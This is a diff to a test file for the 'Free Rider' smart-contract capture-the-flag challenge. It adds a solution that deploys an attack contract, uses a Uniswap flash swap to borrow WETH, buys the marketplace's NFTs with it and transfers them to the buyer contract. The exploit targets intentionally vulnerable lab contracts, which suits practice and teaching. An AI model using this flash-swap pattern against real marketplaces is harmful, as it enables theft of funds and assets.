@@ -105,6 +105,33 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // can do uniswap flash swap for short term liquidity
+        // just buyMany with flash swap liquidity? I think so lolol
+
+        // deploy flashSwap contract
+        const flashswap = await (await ethers.getContractFactory('AttackFlashSwap', attacker)).deploy(
+            await this.uniswapPair.factory(),
+            this.weth.address,
+            this.marketplace.address,
+            this.nft.address,
+        );
+
+        // have attacker deposit some eth to weth
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('0.4')});
+
+        // have attacker approve weth transfer to flashSwap
+        await this.weth.connect(attacker).approve(flashswap.address, ethers.utils.parseEther('0.4'));
+
+        // initiate flashSwap
+        await this.uniswapPair.swap(ethers.utils.parseEther('15'), 0, flashswap.address, [0,1,2,3]);
+
+        // transfer all nfts to buyerContract
+
+        await this.nft.connect(attacker).setApprovalForAll(flashswap.address, true);
+        for (i=0; i<6; i++) {
+            await this.nft.connect(attacker)["safeTransferFrom(address,address,uint256)"](attacker.address, this.buyerContract.address, i);
+        }
     });
 
     after(async function () {
